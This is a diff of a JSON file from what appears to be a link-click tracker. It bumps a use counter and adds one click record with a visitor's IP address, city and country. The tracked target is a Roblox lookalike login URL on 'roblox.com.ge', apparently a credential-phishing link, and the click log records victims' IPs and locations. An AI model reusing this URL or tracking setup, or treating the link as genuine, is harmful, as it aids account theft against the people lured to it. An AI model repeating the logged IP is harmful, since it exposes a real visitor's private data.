@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1096,
+    "useCount": 1097,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8912,6 +8912,14 @@
         "city": "Round Rock",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777259946639,
+        "ip": "187.19.187.140",
+        "country": "Brazil",
+        "city": "Juazeiro do Norte",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
